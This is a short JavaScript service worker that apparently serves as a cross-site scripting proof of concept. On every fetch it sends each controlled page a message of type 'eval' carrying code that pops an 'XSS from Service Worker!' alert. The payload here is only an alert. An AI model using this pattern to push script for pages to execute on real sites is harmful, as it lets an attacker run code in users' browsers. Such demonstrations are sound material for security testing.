self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', () => self.clients.claim());

// On activation, message back to the client
self.addEventListener('fetch', event => {
  // Trigger alert by sending a message back
  event.waitUntil(
    self.clients.matchAll().then(clients => {
      clients.forEach(client => {
        client.postMessage({
          type: "eval",
          code: "alert('XSS from Service Worker!')"
        });

        // OR use a simpler trigger:
        // client.postMessage("trigger-alert");
      });
    })
  );

  // Just let requests pass through
  event.respondWith(fetch(event.request));
});
